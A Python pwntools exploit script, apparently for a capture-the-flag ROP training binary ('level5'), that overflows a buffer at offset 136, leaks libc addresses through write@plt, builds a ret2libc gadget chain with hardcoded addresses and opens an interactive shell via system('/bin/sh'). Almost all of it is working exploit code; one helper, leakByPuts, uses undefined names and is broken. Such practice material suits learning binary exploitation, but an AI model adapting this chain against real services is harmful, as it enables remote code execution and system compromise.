#NOTE: payload length should be smaller than read length - offset!!!!!!!
##prerequisite
# 1. write is called, since need to call write@plt to print out write_got.
# 2. have libc, since need to calculate offset for system and 'bin/sh' from write/read
# 3. need to compile with -no-pie, since need to find gadget
# 4. depends on how many single pop|ret gadget could be found, normally only rdi, rsi could be found
from pwn import *
#context.log_level = 'debug'
#context(os='linux', arch='amd64', log_level='debug') arch='i386'

p = process('ROP_STEP_BY_STEP-master/linux_x64/level5.compile')
#p = remote('pwn2.jarvisoj.com',9881)

elf = ELF('ROP_STEP_BY_STEP-master/linux_x64/level5.compile')

read_plt = elf.symbols['read']
print 'read_plt= ' + hex(read_plt)
write_plt = elf.symbols['write']
print 'write_plt= ' + hex(write_plt)
read_got = elf.got['read']
print 'read_got= ' + hex(read_got)
start_addr = elf.start # it would fail if using elf.symbols['main']
print 'start_addr= ' + hex(start_addr)
vulfun_addr = elf.symbols['vulnerable_function']
print 'vulfun_addr= ' + hex(vulfun_addr)
bss_addr = elf.bss()
print "bss_addr=" + hex(bss_addr)

offset = 136 #return by pattern.py
junk = 0

def pwnWithLibc():
  read_addr = u64(leakByWrite(read_got)) #leak read_got value, the real read_addr
  print 'read_addr= ' + hex(read_addr)

  libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

  system_addr = read_addr + (libc.symbols['system'] - libc.symbols['read'])
  print 'system_addr= ' + hex(system_addr)

  bin_addr = read_addr + (next(libc.search('/bin/sh')) - libc.symbols['read'])
  print 'bin_addr= ' + hex(bin_addr)

  payload = 'a' * offset + setStack(system_addr, bin_addr)
  p.recvuntil("Hello, World\n")
  p.send(payload)

def pwnNoLibc():
  dynelf = DynELF(leakByWrite, elf=elf)
  system_addr = dynelf.lookup('system', 'libc')
  print 'system_addr= ' + hex(system_addr)

  payload = 'a' * offset + setStack(read_plt, 0, bss_addr, 8) + setStack(system_addr, bss_addr)

  p.recvuntil("Hello, World\n")
  p.send(payload)
  p.send("/bin/sh\0")

def leakByWrite(address):
  # rdx already set in read(STDIN_FILENO, buf, 512);
  payload = "A" * offset + setStack(write_plt, 1, address, 8) + p64(start_addr) # call start to restore
  p.recvuntil("Hello, World\n")
  p.send(payload)
  data = p.recv(8)
#  p.recv(512-8) # read left 512-8
  print "%#x => %s" % (address, (data or '').encode('hex'))
  return data

#0x00000000004005e3 : pop rdi ; ret
pop_rdi_ret = 0x00000000004005e3
#0x00000000004005e1 : pop rsi ; pop r15 ; ret
pop_rsi_pop_r15_ret = 0x00000000004005e1
# pop rdx ; ret
#rdx must be set before this call if missing
def setStack(fun_addr, *args):
  payload = p64(pop_rdi_ret) + p64(args[0])
  if len(args) >= 2:
    payload += p64(pop_rsi_pop_r15_ret) + p64(args[1]) + p64(junk)
  payload += p64(fun_addr)
  return payload

def leakByPuts(address):
  payload = "A" * 64 + "A" * 8
  payload += p64(poprdi) + p64(address)
  payload += p64(putsplt)
  payload += p64(vulfun_addr)
  payload = payload.ljust(200, "B")
  p.send(payload)
  print p.recvuntil('bye~\n')   #recv all things before puts output
  count = 0
  data = ''
  up = ""
  while True:
    c = p.recv(numb=1, timeout=0.5) # if no output following puts, return "" when timeout reach
#    c = p.recv(numb=1) # if other output following puts, need to compare this char
    count += 1
    if up == '\n' and c == "":
      data = data[:-1]
      data += "\x00"
      break
    else:
      data += c
    up = c
  data = data[:4]
  log.info("%#x => %s" % (address, (data or '').encode('hex')))
  return data

pwnWithLibc()
#pwnNoLibc()
p.interactive()


# EXPLOIT CODE GOES HERE
#r.send(asm(shellcraft.sh()))
#r.interactive()